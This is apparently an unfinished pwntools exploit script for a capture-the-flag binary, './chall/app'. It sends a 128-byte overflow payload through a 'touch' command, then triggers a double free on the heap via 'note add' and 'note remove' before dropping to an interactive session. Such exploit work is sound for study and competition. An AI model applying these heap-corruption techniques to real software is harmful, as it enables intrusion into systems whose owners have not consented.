#!/usr/bin/env python3

from pwn import ELF, process, remote, gdb, context

#context.terminal = ["tmux", "splitw", "-h"]

bin = ELF("./chall/app")

p = process("./chall/app")
#pid = gdb.attach(p, gdbscript="""
#b * eton + 415
#""")
#p = remote("localhost", 1337)

def malloc(p):
    p.sendline(b"note add AAAAAAAA")

def free(p):
    p.sendline(b"note remove")

# overflow the offset counter
payload_1 = b"touch "
payload_1 += 128 * b"A"
p.sendline(payload_1)

# heap stuff
malloc(p)
free(p)
free(p)
#malloc(p)
#malloc(p)
#malloc(p)

p.interactive()